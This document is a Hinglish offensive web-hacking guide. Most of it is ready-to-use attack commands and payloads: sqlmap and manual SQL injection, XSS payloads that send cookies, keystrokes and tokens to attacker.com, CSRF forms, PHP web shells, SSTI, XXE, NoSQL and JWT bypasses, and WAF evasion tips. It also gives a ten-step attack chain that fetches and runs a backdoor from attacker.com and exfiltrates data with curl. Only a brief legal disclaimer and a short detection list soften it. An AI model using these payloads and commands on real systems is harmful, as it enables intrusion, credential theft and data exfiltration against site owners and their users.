# Web Hacking — Advanced Techniques

**Professional Web Application Exploitation Guide**

---

## 1. SQL Injection - Advanced Exploitation

**Objective:** Database ko hack karke purea data nikalna aur control lena.

```bash
# Basic SQL Injection Test
sqlmap -u "http://target.com/product.php?id=1" -dbs --batch

# Blind SQL Injection (Time-based)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=5 --technique=T

# Boolean-based Blind SQLi
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --technique=B

# Union-based SQL Injection
sqlmap -u "http://target.com/search.php?q=test" -D database_name -T users --dump

# Error-based SQL Injection
sqlmap -u "http://target.com/id.php?id=1" --technique=E --dbs

# Stacked Queries (Multiple Statements)
sqlmap -u "http://target.com/page.php?id=1" --os-shell --technique=S
```

### Advanced SQLi Payloads:

```sql
-- Database enumeration
1' UNION SELECT NULL,NULL,NULL,NULL-- -
1' UNION SELECT database(),user(),version(),NULL-- -
1' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -

-- User extraction
1' UNION SELECT user,password,NULL,NULL FROM mysql.user-- -

-- File reading
1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL-- -

-- File writing
1' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Command execution (if possible)
1'; SELECT sys_exec('id')-- -
```

### Manual SQLi Exploitation:

```bash
# Test for vulnerability
curl "http://target.com/product.php?id=1'"

# Extract database names
curl "http://target.com/product.php?id=1' UNION SELECT database(),NULL,NULL,NULL-- -"

# Enumerate tables
curl "http://target.com/product.php?id=1' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"

# Dump user credentials
curl "http://target.com/product.php?id=1' UNION SELECT username,password,NULL,NULL FROM admin_users-- -"
```

**Detection Difficulty:** ⭐⭐⭐ (Logging se pakda ja sakta hai)

---

## 2. Cross-Site Scripting (XSS) - Complete Guide

**Objective:** User ke browser mein malicious code inject karna.

### Reflected XSS

```bash
# Simple payload
http://target.com/search.php?q=<script>alert('XSS')</script>

# Cookie stealing
http://target.com/search.php?q=<script>
fetch('http://attacker.com/steal.php?cookie='+document.cookie)
</script>

# Keylogger injection
http://target.com/search.php?q=<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/log.php?key='+e.key);
}
</script>

# Session hijacking
http://target.com/search.php?q=<img src=x onerror="fetch('http://attacker.com/capture?session='+document.cookie)">
```

### Stored XSS

```html
<!-- Comment section payload -->
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- Forum post payload -->
<img src=x onerror="this.src='http://attacker.com/steal.php?session='+document.cookie">

<!-- Profile bio payload -->
<svg onload="fetch('http://attacker.com/grab?data='+localStorage.getItem('user_token'))">
```

### DOM-based XSS

```javascript
// Vulnerable code
var user_input = window.location.hash.substring(1);
document.getElementById('output').innerHTML = user_input;

// Payload
http://target.com/page.php#<script>alert('XSS')</script>

// Advanced payload
http://target.com/page.php#<img src=x onerror="fetch('http://attacker.com/steal?token='+document.cookie)">
```

### Bypass WAF/Filters

```javascript
// Using encoding
<script>alert('XSS')</script>
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

// Using HTML entities
&#60;script&#62;alert('XSS')&#60;/script&#62;
&lt;script&gt;alert('XSS')&lt;/script&gt;

// Using event handlers
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe onload="alert('XSS')">
<body onload="alert('XSS')">

// Using javascript: protocol
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')"></iframe>

// Using data: protocol
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

// Using SVG
<svg/onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>

// Using event listeners
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
```

**Detection Difficulty:** ⭐⭐ (Browser console mein dikhai de sakta hai)

---

## 3. Cross-Site Request Forgery (CSRF) - Advanced

**Objective:** Logged-in user se unauthorized requests perform karvana.

### CSRF Attack Methods

```html
<!-- Simple GET-based CSRF -->
<img src="http://bank.com/transfer.php?to=attacker&amount=1000" style="display:none;">

<!-- POST-based CSRF -->
<form id="csrf-form" action="http://bank.com/transfer.php" method="POST" style="display:none;">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="csrf_token" value="">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>

<!-- Auto-submit with JavaScript -->
<script>
  var form = new FormData();
  form.append('to', 'attacker');
  form.append('amount', '1000');
  
  fetch('http://bank.com/transfer.php', {
    method: 'POST',
    body: form,
    credentials: 'include'
  });
</script>
```

### CSRF Token Bypass

```bash
# Test if CSRF token is required
curl -X POST http://target.com/transfer.php \
  -d "to=attacker&amount=1000" \
  -b "session_id=valid_cookie"

# Double submit cookie bypass
# Server checks if POST data matches cookie value - send same value in both

# Null/empty token bypass
-d "csrf_token=&to=attacker&amount=1000"

# Token validation bypass
# Change POST to GET if possible
curl "http://target.com/transfer.php?to=attacker&amount=1000"
```

**Detection Difficulty:** ⭐⭐⭐ (Token validation se bach sakta hai)

---

## 4. Remote Code Execution (RCE) - Complete

**Objective:** Target server par command execute karna.

### File Upload RCE

```bash
# PHP shell upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Uploading with double extension bypass
shell.php.jpg
shell.phtml
shell.php5

# Uploading with null byte (older PHP)
shell.php%00.jpg

# .htaccess file to execute jpg as PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# Using polyglot files (valid image + PHP code)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### Command Injection

```bash
# Basic command injection
http://target.com/ping.php?ip=8.8.8.8; id

# Using command separators
target.com/ping.php?ip=8.8.8.8 | id
target.com/ping.php?ip=8.8.8.8 && id
target.com/ping.php?ip=8.8.8.8 || id
target.com/ping.php?ip=8.8.8.8 & id

# Using backticks
target.com/ping.php?ip=`id`

# Using $() syntax
target.com/ping.php?ip=$(id)

# Blind command injection
target.com/ping.php?ip=8.8.8.8; curl http://attacker.com/?result=$(id)
```

### Template Injection (SSTI)

```bash
# Jinja2 (Python)
{{ 7*7 }}
{{ config }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# ERB (Ruby)
<%= 7*7 %>
<%= system("id") %>

# Twig (PHP)
{{ 7*7 }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

# Thymeleaf (Java)
[[${7*7}]]
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

### Deserialization RCE

```bash
# PHP object injection
O:4:"Test":1:{s:4:"file";s:8:"shell.php";}

# Java deserialization
ysoserial CommonsCollections5 'id' | base64

# Python pickle
pickle.loads(base64_payload)
```

**Detection Difficulty:** ⭐⭐⭐⭐ (WAF detect kar sakte hain)

---

## 5. Authentication Bypass - Advanced

**Objective:** Login mechanism ko dhakhal dena.

### SQL Injection in Login

```bash
# Username field
admin' OR '1'='1
admin' OR 1=1 --
admin' OR 1=1 #
admin' OR 'a'='a

# Password field
' OR '1'='1
' OR 1=1 --
' OR '='

# Both fields
admin' --
admin' #
admin' OR '1'='1' --
```

### Session/Cookie Manipulation

```bash
# Predictable session IDs
curl -b "session_id=1" http://target.com/
curl -b "session_id=2" http://target.com/
curl -b "session_id=3" http://target.com/

# Modifying role in cookie
Original: user_role=guest
Modified: user_role=admin

# Decoding base64 cookies
echo "base64_cookie" | base64 -d
# Modify and re-encode
echo "admin:true" | base64
```

### JWT Token Bypass

```bash
# Test algorithm confusion
# Change algorithm from RS256 to HS256

# Test kid injection
{"alg":"HS256","kid":"../../../etc/passwd"}

# Test null algorithm
{"alg":"none"}

# JWT with empty signature
header.payload.

# Brute force weak secret
john --format=jwt --wordlist=wordlist.txt token.jwt

# Test token expiration bypass
# Modify exp claim to future date
```

### Default Credentials

```bash
# Common default logins
admin:admin
admin:password
admin:12345
test:test
root:root
administrator:administrator

# Database defaults
mysql -u root -p (no password)
psql -U postgres
mongodb://localhost:27017 (no auth)
```

**Detection Difficulty:** ⭐⭐ (Easy to detect in logs)

---

## 6. Server-Side Request Forgery (SSRF)

**Objective:** Server ko khud apne systems par requests bhejna.

### Basic SSRF

```bash
# Test SSRF
http://target.com/image.php?url=http://127.0.0.1:8080

# AWS metadata service
http://target.com/image.php?url=http://169.254.169.254/latest/meta-data/

# Local file access
http://target.com/image.php?url=file:///etc/passwd

# Port scanning internal network
http://target.com/image.php?url=http://192.168.1.1:22
http://target.com/image.php?url=http://192.168.1.1:3306
```

### SSRF Bypass Techniques

```bash
# Using IP alternatives
127.0.0.1 = 0 = 2130706433 = 0x7f000001

# Using alternative hosts
127.0.0.1
localhost
::1 (IPv6)
0.0.0.0

# Double URL encoding
http://target.com/image.php?url=%2570%2561%2573%2577%2f%2565%2564%2f%2570%2561%2573%2573%2577%2564

# Using @ symbol
http://attacker@127.0.0.1@target.com

# DNS rebinding
http://target.com/image.php?url=http://rebind.example.com (resolves to 127.0.0.1)
```

**Detection Difficulty:** ⭐⭐⭐ (Server logs se track kar sakte ho)

---

## 7. XML External Entity (XXE) - Advanced

**Objective:** XML parser ke through file access aur RCE.

### XXE Payload

```xml
<!-- Basic XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- DTD external entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

<!-- Blind XXE with out-of-band -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil.php?data=PLACEHOLDER">
]>
<foo>&xxe;</foo>

<!-- XXE with file inclusion -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```

### XXE RCE via Expect Protocol

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

**Detection Difficulty:** ⭐⭐⭐ (WAF se detect ho sakta hai)

---

## 8. NoSQL Injection

**Objective:** MongoDB, CouchDB, etc. databases ko hack karna.

### MongoDB Injection

```bash
# Basic NoSQL injection
db.users.find({username: req.body.username, password: req.body.password})

# Bypass login
{"$ne": ""}
{"$ne": null}

# Payload in JSON
{"username": {"$ne": ""}, "password": {"$ne": ""}}

# Using $or operator
{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}

# Extracting data
db.users.find({"username": {"$regex": "a.*"}})

# Command execution
db.users.find({$where: "this.username == 'admin' && sleep(1000)"})
```

### CouchDB Exploitation

```bash
# Accessing CouchDB without auth (if exposed)
curl http://target.com:5984/_all_dbs

# Listing documents
curl http://target.com:5984/database/_all_docs

# Extracting sensitive data
curl http://target.com:5984/users/_all_docs

# Creating admin user
curl -X PUT http://target.com:5984/_users/org.couchdb.user:admin \
  -H "Content-Type: application/json" \
  -d '{"type":"user","name":"admin","password":"newpass","roles":[]}'
```

**Detection Difficulty:** ⭐⭐⭐ (Query monitoring se detect ho sakta hai)

---

## 9. API Exploitation - Advanced

**Objective:** API ke through unauthorized data access aur manipulation.

### API Enumeration

```bash
# Discover API endpoints
curl -s http://target.com/api/
curl -s http://target.com/api/v1/
curl -s http://target.com/swagger.json
curl -s http://target.com/api-docs

# Brute force endpoints
gobuster dir -u http://target.com/api/ -w wordlist.txt

# Parameter fuzzing
http://target.com/api/users?id=1
http://target.com/api/users?user_id=1
http://target.com/api/users?uid=1
```

### API Authentication Bypass

```bash
# Missing authentication
curl http://target.com/api/admin (no token)

# Weak token validation
curl -H "Authorization: Bearer admin" http://target.com/api/users

# JWT with no signature verification
curl -H "Authorization: Bearer eyJhbGc..." http://target.com/api/users

# API key in URL
curl "http://target.com/api/users?api_key=test123"

# Brute force API keys
for i in {1..10000}; do
  curl -H "X-API-Key: $i" http://target.com/api/users
done
```

### Rate Limiting Bypass

```bash
# Using different IP headers
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/api/users

# Distributed requests
for ip in {1..100}; do
  curl -H "X-Forwarded-For: $ip.0.0.1" http://target.com/api/users &
done
```

**Detection Difficulty:** ⭐⭐⭐⭐ (API logging se clear track hai)

---

## 10. Advanced Web Exploitation Combo

**Objective:** Maximum damage with multiple techniques combined.

### Full Attack Chain

```bash
# Step 1: Reconnaissance
nmap -p 80,443 -sV target.com
curl -I http://target.com
whatweb http://target.com

# Step 2: Find vulnerabilities
sqlmap -u "http://target.com/product.php?id=1" --crawl=2 --batch

# Step 3: Enumerate users via SQL injection
sqlmap -u "http://target.com/product.php?id=1" -D database -T users --dump

# Step 4: Crack password hashes
hashcat -m 1400 hashes.txt wordlist.txt

# Step 5: Bypass authentication
curl -b "session_id=admin:admin" http://target.com/admin

# Step 6: Upload shell via file upload
curl -F "file=@shell.php" http://target.com/upload.php

# Step 7: Execute commands
curl "http://target.com/uploads/shell.php?cmd=id"

# Step 8: Create persistence
curl "http://target.com/uploads/shell.php?cmd=wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && bash /tmp/bd.sh"

# Step 9: Privilege escalation
curl "http://target.com/uploads/shell.php?cmd=sudo -l"

# Step 10: Data exfiltration
curl "http://target.com/uploads/shell.php?cmd=tar czf - /sensitive/data | curl -X POST -d @- http://attacker.com/exfil"
```

### One-liner Exploitation

```bash
# Complete exploitation in one command
sqlmap -u "http://target.com/product.php?id=1" --os-shell --technique=U,E --batch
```

**Detection Difficulty:** ⭐⭐⭐⭐⭐ (Multiple logs generate hote hain)

---

## Web Hacking Tools

```bash
# Vulnerability scanning
nikto -h http://target.com
wpscan --url http://target.com
sqlmap -u "http://target.com/page.php?id=1" --batch

# Proxy and interception
burpsuite
mitmproxy
zaproxy

# Exploitation frameworks
metasploit
searchsploit

# Encoding and decoding
burpsuite decoder
cyberchef

# Wordlist generation
crunch 8 10 -t "password%%%"
```

---

## Detection aur Prevention

### Logs Mein Kya Dikhai Deta Hai:

⚠️ **Ye signals attack indicate karte hain:**
- Multiple SQL syntax errors in logs
- Unusual characters in GET/POST parameters
- File upload attempts with .php extension
- Multiple failed login attempts
- Unusual API endpoint access
- Large data exfiltration requests

### WAF Bypass Tips:

- URL encoding use karo
- Case variation (ScRiPt, SCRIPT)
- Comments add karo (/* */, --, #)
- Double encoding
- Null byte injection
- Alternative protocols (data:, javascript:)

---

## Kanuni Chetavni

```
⚖️ Savdhani! ⚖️

Ye techniques sirf iske liye authorized hain:
✓ Authorized penetration testing
✓ Apne khud ke applications par
✓ Bug bounty programs
✓ Licensed security testing

Ye techniques ILLEGAL hain yaha:
✗ Unauthorized access
✗ Dusron ke systems par
✗ Data theft
✗ Malware distribution

Punishment:
- Federal prison
- Heavy fines
- Civil liability

Zimmedari se use karo!
```

---

## Quick Reference - Web Hacking Commands

```bash
# SQL Injection
sqlmap -u "URL" --dbs --batch

# XSS testing
burpsuite (use scanner)

# CSRF token bypass
curl -X POST --data "csrf_token=&data=value" http://target.com/form

# RCE via file upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# JWT bypass
jwt_tool token.jwt -V

# SSRF testing
curl "http://target.com/fetch.php?url=http://127.0.0.1:8080"

# XXE exploitation
curl -X POST --data @xxe.xml http://target.com/api

# NoSQL injection
curl -X POST --json '{"username":{"$ne":""}}' http://target.com/api/login

# API enumeration
gobuster dir -u http://target.com/api -w wordlist.txt

# Complete attack
sqlmap -u "URL" --os-shell --technique=U,E --batch
```

---

**Banaya Gaya:** Web Hacking Database  
**Classification:** Advanced Web Security  
**Skill Level:** Expert  
**Risk Level:** Critical  
**Language:** Hinglish

---

**Last Updated:** 2026-06-16  
**Creator:** Red Team Ops

---
